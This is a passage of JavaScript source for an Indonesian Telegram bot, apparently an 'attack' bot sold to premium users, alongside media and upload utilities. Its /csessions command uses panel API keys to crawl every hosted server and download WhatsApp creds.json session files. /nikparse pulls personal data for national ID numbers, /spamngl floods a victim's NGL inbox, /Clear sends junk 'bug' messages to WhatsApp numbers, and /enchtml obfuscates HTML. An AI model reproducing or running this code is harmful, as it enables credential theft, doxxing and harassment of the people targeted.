    const response = await axios.get(fileUrl, { responseType: "stream" });
    const content = await streamToBuffer(response.data);
    const contentBase64 = content.toString("base64");

    // === Buat repo GitHub ===
    const repoName = `vercel-${domainName}-${Date.now()}`;
    const githubResponse = await axios.post(
      "https://api.github.com/user/repos",
      {
        name: repoName,
        auto_init: false,
        private: false,
      },
      {
        headers: {
          Authorization: `token ${process.env.GITHUB_TOKEN}`,
          Accept: "application/vnd.github.v3+json",
        },
      }
    );

    await bot.sendMessage(
      chatId,
      `✅ Website berhasil di-deploy ke Vercel!\n\n🌐 Domain: https://${domainName}.vercel.app\n📊 Status: ${vercelResponse.data.status}`
    );
  } catch (error) {
    console.error("Error deploying to Vercel:", error.response?.data || error.message);
    await bot.sendMessage(chatId, "❌ Gagal mendeploy ke Vercel. Silakan coba lagi nanti.");
  }
});


// -- ( case nik perse )
bot.onText(/\/nikparse(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const nik = match[1].trim();
  if (shouldIgnoreMessage(msg)) return;

  // Validasi input
  if (!nik) {
    return bot.sendMessage(chatId, "🪧 Format: /nikparse 1234567890283625");
  }

  if (!/^\d{16}$/.test(nik)) {
    return bot.sendMessage(chatId, "❌ ☇ NIK harus 16 digit angka");
  }

  // Kirim pesan menunggu
  const waitMsg = await bot.sendMessage(chatId, "⏳ ☇ Sedang memproses pengecekan NIK...");

  // Fungsi buat format hasil
  const replyHTML = async (d) => {
    const get = (x) => x ?? "-";
    const caption = `
<blockquote><b>｢ ⸸ ｣ Majèsty's ↯ Võcius ♰ </b></blockquote>
⌑ NIK: ${get(d.nik) || nik}
⌑ Nama: ${get(d.nama)}
⌑ Jenis Kelamin: ${get(d.jenis_kelamin || d.gender)}
⌑ Tempat Lahir: ${get(d.tempat_lahir || d.tempat)}
⌑ Tanggal Lahir: ${get(d.tanggal_lahir || d.tgl_lahir)}
⌑ Umur: ${get(d.umur)}
⌑ Provinsi: ${get(d.provinsi || d.province)}
⌑ Kabupaten/Kota: ${get(d.kabupaten || d.kota || d.regency)}
⌑ Kecamatan: ${get(d.kecamatan || d.district)}
⌑ Kelurahan/Desa: ${get(d.kelurahan || d.village)}
    `;

    await bot.sendMessage(chatId, caption, { parse_mode: "HTML", disable_web_page_preview: true });
  };

  // === Mulai proses cek NIK ===
  try {
    const a1 = await axios.get(`https://api.akuari.my.id/national/nik?nik=${nik}`, {
      headers: { "user-agent": "Mozilla/5.0" },
      timeout: 15000,
    });

    if (a1?.data?.status && a1?.data?.result) {
      await replyHTML(a1.data.result);
    } else {
      const a2 = await axios.get(`https://api.nikparser.com/nik/${nik}`, {
        headers: { "user-agent": "Mozilla/5.0" },
        timeout: 15000,
      });
      if (a2?.data) {
        await replyHTML(a2.data);
      } else {
        await bot.sendMessage(chatId, "❌ ☇ NIK tidak ditemukan");
      }
    }
  } catch (err) {
    try {
      const a2 = await axios.get(`https://api.nikparser.com/nik/${nik}`, {
        headers: { "user-agent": "Mozilla/5.0" },
        timeout: 15000,
      });
      if (a2?.data) {
        await replyHTML(a2.data);
      } else {
        await bot.sendMessage(chatId, "❌ ☇ Gagal menghubungi API, coba lagi nanti");
      }
    } catch {
      await bot.sendMessage(chatId, "❌ ☇ Gagal menghubungi API, coba lagi nanti");
    }
  } finally {
    // Hapus pesan "menunggu"
    try {
      await bot.deleteMessage(chatId, waitMsg.message_id);
    } catch (e) {}
  }
});


// -- ( Case Enc Html ) 
bot.onText(/\/enchtml/, async (msg) => {
  const chatId = msg.chat.id;
  if (shouldIgnoreMessage(msg)) return;

  // Cek apakah user reply ke file .html
  if (!msg.reply_to_message || !msg.reply_to_message.document) {
    return bot.sendMessage(chatId, "❌ Silakan reply ke file .html yang ingin dienkripsi.");
  }

  const document = msg.reply_to_message.document;

  // Pastikan ekstensi file .html
  if (!document.file_name.endsWith(".html")) {
    return bot.sendMessage(chatId, "❌ File harus berekstensi .html!");
  }

  try {
    // Ambil file dari Telegram
    const fileId = document.file_id;
    const file = await bot.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${TOKEN_BOT}/${file.file_path}`;

    // Download isi file HTML
    const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
    const htmlContent = Buffer.from(response.data).toString("utf8");

    // Encode ke Base64
    const encoded = Buffer.from(htmlContent, "utf8").toString("base64");

    // Template hasil enkripsi
    const encryptedHTML = `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<title>Vero.Vrl</title>
<script>
(function(){
  try { document.write(atob("${encoded}")); }
  catch(e){ console.error(e); }
})();
</script>
</head>
<body></body>
</html>`;

    // Simpan hasilnya
    const outputPath = path.join(__dirname, "encbyrazx.html");
    fs.writeFileSync(outputPath, encryptedHTML, "utf-8");

    // Kirim balik file ke user
    await bot.sendDocument(chatId, outputPath, {
      caption: "✅ Enc Html By Majesty's (🍁)",
    });

    // Hapus file setelah dikirim
    fs.unlinkSync(outputPath);
  } catch (error) {
    console.error("Error saat enkripsi:", error);
    bot.sendMessage(chatId, "❌ Terjadi error saat membuat file terenkripsi.");
  }
});


bot.onText(/^\/csessions(?:@[\w_]+)?(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];

  if (!input) {
    return bot.sendMessage(
      chatId,
      "Format salah.\nGunakan:\n`/csessions domain,plta,pltc`",
      { parse_mode: "Markdown" }
    );
  }

  const parts = input.split(",");
  const domain = parts[0];
  const plta = parts[1];
  const pltc = parts[2];

  if (!domain || !plta || !pltc) {
    return bot.sendMessage(
      chatId,
      "Format salah.\nGunakan:\n`/csessions domain,plta,pltc`",
      { parse_mode: "Markdown" }
    );
  }

  await bot.sendMessage(chatId, "Sedang scan semua server untuk mencari creds.json ...");

  function norm(p) {
    return p.replace(/\/+/g, "/");
  }

  function isDir(item) {
    const a = item?.attributes;
    if (!a) return false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function traverse(identifier, dir = "/") {
    try {
      const r = await axios.get(
        `${domain.replace(/\/+$/, "")}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` }
        }
      );

      const list = r.data?.data;
      if (!Array.isArray(list)) return [];

      let found = [];

      for (let item of list) {
        const name = item.attributes?.name || item.name || "";
        const path = norm((dir === "/" ? "" : dir) + "/" + name);

        if (name.toLowerCase() === "creds.json") found.push(path);

        if (name.toLowerCase() === "sessions" && isDir(item)) {
          try {
            const sr = await axios.get(
              `${domain.replace(/\/+$/, "")}/api/client/servers/${identifier}/files/list`,
              {
                params: { directory: path },
                headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` }
              }
            );

            const sessionList = sr.data?.data || [];
            for (let f of sessionList) {
              const fn = f.attributes?.name || f.name || "";
              if (fn.toLowerCase() === "creds.json") {
                found.push(norm(path + "/" + fn));
              }
            }
          } catch {}
        }

        if (isDir(item)) {
          try {
            const more = await traverse(identifier, path === "" ? "/" : path);
            found = found.concat(more);
          } catch {}
        }
      }

      return found;
    } catch {
      return [];
    }
  }

  try {
    const sr = await axios.get(
      `${domain.replace(/\/+$/, "")}/api/application/servers`,
      {
        headers: { Accept: "application/json", Authorization: `Bearer ${plta}` }
      }
    );

    const servers = sr.data?.data;
    if (!Array.isArray(servers))
      return bot.sendMessage(chatId, "Gagal ambil list server.");

    let total = 0;

    for (let s of servers) {
      const identifier =
        s.attributes?.identifier || s.identifier || s.attributes?.id;
      const name = s.attributes?.name || s.name || identifier || "unknown";

      if (!identifier) continue;

      let paths = await traverse(identifier);

      for (let p of SCAN_PATHS) {
        const np = norm(p);
        if (!paths.includes(np)) paths.push(np);
      }

      for (let filePath of paths) {
  try {
    const d = await axios.get(
      `${domain.replace(/\/+$/, "")}/api/client/servers/${identifier}/files/download`,
      {
        params: { file: filePath },
        headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` }
      }
    );

    const url = d.data?.attributes?.url;
    if (!url) continue;

    const fileDl = await axios.get(url, { responseType: "arraybuffer" });
    const buf = Buffer.from(fileDl.data);

    total++;

await bot.sendMessage(
  chatId,
  `Ditemukan creds.json di *${name}*\nPath: \`${filePath}\``,
  { parse_mode: "Markdown" }
);

await bot.sendDocument(
  chatId,
  buf,                                 
  { caption: "creds.json" },         
  {
    filename: "creds.json",        
    contentType: "application/json"  
  }
);


    fs.unlinkSync(tmpPath);

  } catch (err) {
    console.log("SEND ERROR:", err?.response?.data || err?.message);
  }
}
    }

    if (total === 0)
      return bot.sendMessage(chatId, "Scan selesai. Tidak ditemukan creds.json.");

    bot.sendMessage(chatId, `Scan selesai. Total dikirim: ${total}`);
  } catch {
    bot.sendMessage(chatId, "Terjadi error saat scan.");
  }
});


bot.onText(/\/delpair/, async (msg) => { // tambahkan 'async'
    const chatId = msg.chat.id;
    if (shouldIgnoreMessage(msg)) return;
    if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "𝘿𝙖𝙣 𝙔𝙖𝙥!? 𝙀𝙣𝙩𝙚 𝙎𝙞𝙖𝙥𝙖? 𝙔𝙖𝙣𝙜 𝘽𝙞𝙨𝙖 𝙈𝙖𝙠𝙚 𝘾𝙪𝙢𝙖𝙣 𝙊𝙬𝙣𝙚𝙧 𝙂𝙬!!✘𓂸",
    { parse_mode: "Markdown" }
  );
}
    await clearSessionDirectory(); // gunakan 'await'
    bot.sendMessage(chatId, 'Semua Sender Dan File Sessions Sudah Dihapus\nᴄʀᴇᴀᴛᴇ ʙʏ xᴘʟᴏɪᴛ⸙');
});


bot.onText(/^\/trackip(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (shouldIgnoreMessage(msg)) return;
  if (!isOwner(msg.from.id)) return bot.sendMessage(chatId, '❌ Hanya owner.')
  try {
    if (!match[1]) {
      return bot.sendMessage(chatId, "ip nya mana dongo", {
        reply_to_message_id: msg.message_id,
      });
    }
    const res = await axios.get(`https://ipwhois.app/json/${match[1]}`);
    const d = res.data;
    await bot.sendMessage(chatId, "```json\n" + JSON.stringify(d, null, 2) + "```", {
        parse_mode: "Markdown",
        reply_to_message_id: msg.message_id,
      });
  } catch (err) {
    bot.sendMessage(chatId, err.message, {
      reply_to_message_id: msg.message_id,
    });
  }
})

bot.onText(/^\/update$/, async (msg) => {
    const chatId = msg.chat.id;

    bot.sendMessage(chatId, "🔄 Proses Auto Update");

    try {
        await downloadRepo("");
        bot.sendMessage(chatId, "✅ Update selesai!\n🔁 Bot restart otomatis.");

        setTimeout(() => process.exit(0), 1500);

    } catch (e) {
        bot.sendMessage(chatId, "❌ Gagal update, cek repo GitHub atau koneksi.");
        console.error(e);
    }
});

bot.onText(/\/gethtml (.+)?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const url = match[1];
    if (shouldIgnoreMessage(msg)) return;    
    if (!/^https?:\/\//.test(url)) 
        return bot.sendMessage(chatId, `Example: /gethtml https://Majestys.tzy.id`, {
        parse_mode: "HTML"
        });

    bot.sendMessage(chatId, `⚡ Proses mengambil file.`, {
    parse_mode: "HTML"
    });

    try {
        const res = await fetch(url);
        const contentLength = parseInt(res.headers.get("content-length") || "0");
        if (contentLength > 100 * 1024 * 1024)
            throw `File terlalu besar: ${contentLength} bytes`;

        const contentType = res.headers.get("content-type") || "";

        if (contentType.startsWith("image/")) {
            return bot.sendPhoto(chatId, url);
        }

        if (contentType.startsWith("video/")) {
            return bot.sendVideo(chatId, url);
        }

        if (contentType.startsWith("audio/")) {
            return bot.sendAudio(chatId, url, { caption: "Audio dari URL" });
        }

        const arrayBuffer = await res.arrayBuffer();
        const buffer = Buffer.from(arrayBuffer);

        if (contentType.includes("text") || contentType.includes("json")) {
            let text = buffer.toString();

            if (text.length > 4096) {
    const htmlContent = text;

    return bot.sendDocument(
        chatId,
        Buffer.from(htmlContent, "utf-8"),
        { caption: "Hasil HTML dari URL" },
        { filename: "Majesty's.html", contentType: "text/html" }
    );
} else {
                return bot.sendMessage(chatId, text);
            }
        } else {
            return bot.sendDocument(
                chatId,
                buffer,
                { caption: "File dari URL" },
                { filename: "file.bin", contentType: contentType || "application/octet-stream" }
            );
        }

    } catch (err) {
        return bot.sendMessage(chatId, `❌ Gagal mengambil file: ` + err);
    }
});

bot.onText(/^\/spamngl(?:\s+(.+))?$/i, async (msg, match) => {
   const chatId = msg.chat.id
  const senderId = msg.from.id
  const randomImage = getRandomImage()

  if (shouldIgnoreMessage(msg)) return

  if (
    senderId !== MASTER_ADMIN_ID &&
    !(
      Array.isArray(premiumUsers) &&
      premiumUsers.some(u =>
        (u.id === senderId || u.id === msg.chat.id) &&
        new Date(u.expiresAt) > new Date()
      )
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝘖𝘸𝘯𝘦𝘳", url: settings.OWNER_URL }]]
      }
    })
  }
  const raw = (match && match[1]) ? match[1].trim() : ""
  if (!raw) return bot.sendMessage(chatId, "⎙ ⸙ Format: /spamngl <loops> <pesan> <@username>\nContoh: /spamngl 50 Plerrr @xnxxjavewe1")

  const parts = raw.split(/\s+/)
  if (parts.length < 2) return bot.sendMessage(chatId, "⎙ ⸙ Format: /spamngl <loops> <pesan> <@username>")

  const loops = Number(parts[0]) || 0
  const username = parts.length >= 2 ? parts[parts.length - 1].replace(/^@/, "") : ""
  const message = parts.slice(1, parts.length - 1).join(" ") || ""

  if (!loops || loops <= 0) return bot.sendMessage(chatId, "✘ Nilai <loops> tidak valid")
  if (!username) return bot.sendMessage(chatId, "✘ Username tidak ditemukan")
  if (!message) return bot.sendMessage(chatId, "✘ Pesan tidak boleh kosong")

  const delay = 5000
  await bot.sendMessage(chatId, `⸙ Mengirim ${loops} pesan ke @${username}`)

  for (let i = 1; i <= loops; i++) {
    try {
      const arr = new Uint8Array(21)
      crypto.getRandomValues(arr)
      const deviceId = Array.from(arr, x => x.toString(16).padStart(2, "0")).join("")
      const body = `username=${username}&question=${encodeURIComponent(message)}&deviceId=${deviceId}`
      await fetch("https://ngl.link/api/submit", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" },
        body
      })
    } catch {}
    if (i < loops) await new Promise(r => setTimeout(r, delay))
  }

  bot.sendMessage(chatId, `⸙ sҽlҽsαí sթαตղցl ${loops} թҽsαղ kҽ @${username}`)
})

bot.onText(/\/ig(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    if (shouldIgnoreMessage(msg)) return;
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide an Instagram post/reel URL.\n\nExample:\n/ig https://www.instagram.com/reel/xxxxxx/");
    }

    const url = match[1].trim();

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/download/instagram?url=${encodeURIComponent(url)}`;

        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result) {
            return bot.sendMessage(chatId, "❌ Failed to fetch Instagram media. Please check the URL.");
        }

        // Jika ada video
        if (data.result.video) {
            await bot.sendVideo(chatId, data.result.video, {
                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
            });
        } 
        // Jika hanya gambar
        else if (data.result.image) {
            await bot.sendPhoto(chatId, data.result.image, {
                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
            });
        } 
        else {
            bot.sendMessage(chatId, "❌ Unsupported media type from Instagram.");
        }
    } catch (err) {
        console.error("Instagram API Error:", err);
        bot.sendMessage(chatId, "❌ Error fetching Instagram media. Please try again later.");
    }
});


bot.onText(/\/brat(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    if (shouldIgnoreMessage(msg)) return;
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a text.\n\nExample:\n/brat Hallo All");
    }

    const text = match[1].trim();

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/imagecreator/bratv?text=${encodeURIComponent(text)}`;

        // langsung kirim gambar dari API
        await bot.sendPhoto(chatId, apiUrl, {
            caption: `🖼️ Brat Image Generated\n\n✏️ Text: *${text}*`,
            parse_mode: "Markdown"
        });
    } catch (err) {
        console.error("Brat API Error:", err);
        bot.sendMessage(chatId, "❌ Error generating Brat image. Please try again later.");
    }
});


bot.onText(/\/pinterest(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    if (shouldIgnoreMessage(msg)) return;
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a search query.\n\nExample:\n/pinterest iPhone 17 Pro Max");
    }

    const query = match[1].trim();

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/search/pinterest?q=${encodeURIComponent(query)}`;

        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result || data.result.length === 0) {
            return bot.sendMessage(chatId, "❌ No Pinterest images found for your query.");
        }

        // Ambil gambar pertama dari hasil
        const firstResult = data.result[0];

        await bot.sendPhoto(chatId, firstResult, {
            caption: `📌 Pinterest Result for: *${query}*`,
            parse_mode: "Markdown"
        });
    } catch (err) {
        console.error("Pinterest API Error:", err);
        bot.sendMessage(chatId, "❌ Error fetching Pinterest image. Please try again later.");
    }
});

bot.onText(/\/cek/, async (msg) => {
  const chatId = msg.chat.id;

  if (!msg.reply_to_message || !msg.reply_to_message.document) {
    return bot.sendMessage(chatId,
      "❌ <b>Reply</b> ke file <code>.js</code> yang ingin dicek.",
      { parse_mode: "HTML" }
    );
  }

  const doc = msg.reply_to_message.document;

  if (!doc.file_name.endsWith(".js")) {
    return bot.sendMessage(chatId,
      "❌ File harus berformat <code>.js</code>",
      { parse_mode: "HTML" }
    );
  }

  try {
    const fileLink = await bot.getFileLink(doc.file_id);
    const res = await fetch(fileLink);
    const code = await res.text();
    try {
      acorn.parse(code, {
        ecmaVersion: "latest",
        sourceType: "module",
        locations: true,
      });

      return bot.sendMessage(chatId,
        "<b>✅ Syntax OK</b>\nFile JavaScript valid.",
        { parse_mode: "HTML" }
      );

    } catch (err) {
      const loc = err.loc || { line: "-", column: "-" };
      const line = loc.line ?? "-";
      const col = loc.column ?? "-";

      const lines = code.split(/\r?\n/);
      const errLine = lines[line - 1] || "";

      const caret = " ".repeat(Math.min(col, errLine.length)) + "^";

      const html = `
<b>❌ Syntax Error</b>

<b>Pesan:</b> <code>${escapeHtml(err.message)}</code>
<b>Baris:</b> <code>${line}</code>  
<b>Kolom:</b> <code>${col}</code>

<b>Bagian error:</b>
<pre>${escapeHtml(errLine)}</pre>
<pre>${escapeHtml(caret)}</pre>
      `;

      return bot.sendMessage(chatId, html, { parse_mode: "HTML" });
    }

  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "❌ Terjadi error saat membaca file.");
  }
});

bot.onText(/^\/Clear\s+(.+)/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;
    const q = match[1]; // Ambil argumen setelah /delete-bug
    const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return;    
if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: settings.OWNER_URL }]
      ]
    }
  });
}
    
    if (!q) {
        return bot.sendMessage(chatId, `Cara Pakai Nih Njing!!!\n/Clear 62xxx`);
    }
    
    let pepec = q.replace(/[^0-9]/g, "");
    if (pepec.startsWith('0')) {
        return bot.sendMessage(chatId, `Contoh : /Clear 62xxx`);
    }
    
    let target = pepec + '@s.whatsapp.net';
    
    try {
        for (let i = 0; i < 5; i++) {
            await sock.sendMessage(target, { 
                text: "𝙊𝙏𝘼𝙓 𝘾𝙇𝙀𝘼𝙍 𝘽𝙐𝙂\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝙊𝙩𝙖𝙓𝙭𝙭 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆"
            });
        }
        bot.sendMessage(chatId, "Done Clear Bug By Dapaa!!!");
    } catch (err) {
        console.error("Error:", err);
        bot.sendMessage(chatId, "Ada kesalahan saat mengirim bug.");
    }
});


async function getWhatsAppChannelInfo(sock, link) {
        if (!link.includes("https://whatsapp.com/channel/")) return { error: "Link tidak valid!" };

        let channelId = link.split("https://whatsapp.com/channel/")[1];
        try {
                let res = await sock.newsletterMetadata("invite", channelId);
                return {
                        id          : res.id,
                        name        : res.name,
                        subscribers : res.subscribers,
                        status      : res.state,
                        verified    : res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"
                };
        } catch (err) {
                return { error: "Gagal mengambil data! Pastikan channel valid." };
        }
}

bot.onText(/\/addgroup/, async (msg) => {

    if (msg.chat.type === 'private') {
        return bot.sendMessage(msg.chat.id, 'Perintah ini hanya dapat digunakan di grup.');
    }

    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const senderId = msg.from.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "𝘿𝙖𝙣 𝙔𝙖𝙥!? 𝙀𝙣𝙩𝙚 𝙎𝙞𝙖𝙥𝙖? 𝙔𝙖𝙣𝙜 𝘽𝙞𝙨𝙖 𝙈𝙖𝙠𝙚 𝘾𝙪𝙢𝙖𝙣 𝙊𝙬𝙣𝙚𝙧 𝙂𝙬!!✘𓂸",
    { parse_mode: "Markdown" }
  );
}

        addGroupToAllowed(chatId); 
    } catch (error) {
        console.error('Error adding group:', error);
        bot.sendMessage(msg.chat.id, 'Terjadi kesalahan saat menambahkan grup.');
    }
});

bot.onText(/\/delgroup/, async (msg) => {
    
    if (msg.chat.type === 'private') {
        return bot.sendMessage(msg.chat.id, 'Perintah ini hanya dapat digunakan di grup.');
    }
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const senderId = msg.from.id;
        if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "𝘿𝙖𝙣 𝙔𝙖𝙥!? 𝙀𝙣𝙩𝙚 𝙎𝙞𝙖𝙥𝙖? 𝙔𝙖𝙣𝙜 𝘽𝙞𝙨𝙖 𝙈𝙖𝙠𝙚 𝘾𝙪𝙢𝙖𝙣 𝙊𝙬𝙣𝙚𝙧 𝙂𝙬!!✘𓂸",
            { parse_mode: "Markdown" }
        );
    }

        removeGroupFromAllowed(chatId); 
    } catch (error) {
        console.error('Error deleting group:', error);
        bot.sendMessage(msg.chat.id, 'Terjadi kesalahan saat menghapus grup.');
    }
});

bot.onText(/\/groupon/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
        if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "𝘿𝙖𝙣 𝙔𝙖𝙥!? 𝙀𝙣𝙩𝙚 𝙎𝙞𝙖𝙥𝙖? 𝙔𝙖𝙣𝙜 𝘽𝙞𝙨𝙖 𝙈𝙖𝙠𝙚 𝘾𝙪𝙢𝙖𝙣 𝙊𝙬𝙣𝙚𝙧 𝙂𝙬!!✘𓂸",
            { parse_mode: "Markdown" }
        );
    }

    try {
        setOnlyGroup(true); 
        await bot.sendMessage(chatId, "✅ Mode hanya grup diaktifkan!");
    } catch (error) {
        console.error("Kesalahan saat mengaktifkan mode hanya grup:", error);
        await bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengaktifkan mode hanya grup.");
    }
});

// Command untuk menonaktifkan mode hanya grup
bot.onText(/\/groupoff/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
    
        if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "𝘿𝙖𝙣 𝙔𝙖𝙥!? 𝙀𝙣𝙩𝙚 𝙎𝙞𝙖𝙥𝙖? 𝙔𝙖𝙣𝙜 𝘽𝙞𝙨𝙖 𝙈𝙖𝙠𝙚 𝘾𝙪𝙢𝙖𝙣 𝙊𝙬𝙣𝙚𝙧 𝙂𝙬!!✘𓂸",
            { parse_mode: "Markdown" }
        );
    }

    try {
        setOnlyGroup(false); 
        await bot.sendMessage(chatId, "✅ Mode hanya grup dinonaktifkan!");
    } catch (error) {
        console.error("Kesalahan saat menonaktifkan mode hanya grup:", error);
        await bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menonaktifkan mode hanya grup.");
    }
});

bot.onText(/\/stop/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
   if (shouldIgnoreMessage(msg)) return;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "𝙇𝙪 𝙎𝙞𝙖𝙥𝙖 𝙈𝙚𝙠!? 𝙂𝙖 𝘼𝙙𝙖 𝙃𝙖𝙠 𝘽𝙪𝙖𝙩 𝙈𝙖𝙠𝙚 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 𝙄𝙣𝙞×‌×");
  }
  stopAllControllers();
  bot.sendMessage(msg.chat.id, `∅ Semua serangan telah dihentikan secara manual.`);
});

bot.onText(/^\/tourl$/, async (msg) => {
    const chatId = msg.chat.id;  
    if (shouldIgnoreMessage(msg)) return;     
    if (!msg.reply_to_message || (!msg.reply_to_message.document && !msg.reply_to_message.photo && !msg.reply_to_message.video)) {
        return bot.sendMessage(chatId, "```❌\n❌ Silakan reply sebuah file/foto/video dengan command /tourl```", { reply_to_message_id: msg.message_id, parse_mode: "Markdown" });
    }
    const repliedMsg = msg.reply_to_message;
    let fileId, fileName;    
    if (repliedMsg.document) {
        fileId = repliedMsg.document.file_id;
        fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
    } else if (repliedMsg.photo) {
        fileId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id;
        fileName = `photo_${Date.now()}.jpg`;
    } else if (repliedMsg.video) {
        fileId = repliedMsg.video.file_id;
        fileName = `video_${Date.now()}.mp4`;
    }
    try {        
        const processingMsg = await bot.sendMessage(chatId, "```⌛\n⏳ Mengupload ke Catbox...```", { reply_to_message_id: msg.message_id, parse_mode: "Markdown" });        
        const fileLink = await bot.getFileLink(fileId);
        const response = await axios.get(fileLink, { responseType: 'stream' });
        const FormData = require ("form-data");
        const form = new FormData();
        form.append('reqtype', 'fileupload');
        form.append('fileToUpload', response.data, {
            filename: fileName,
            contentType: response.headers['content-type']
        });
        const { data: catboxUrl } = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: form.getHeaders()
        });

        
        await bot.editMessageText(`*✅ Upload berhasil! 📎URL:* \`\`\`🖼️📎\n${catboxUrl}\`\`\``, {
            chat_id: chatId,
            message_id: processingMsg.message_id,
            parse_mode: "Markdown"
        });

    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, "❌ Gagal mengupload file ke Catbox");
    }
});


bot.onText(/^\/iqc (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];
  if (shouldIgnoreMessage(msg)) return;
  if (!text) {
    return bot.sendMessage(
      chatId,
      "⚠ Gunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return bot.sendMessage(
      chatId,
      "⚠ Format salah!\nGunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  bot.sendMessage(chatId, "⏳ Tunggu sebentar...");

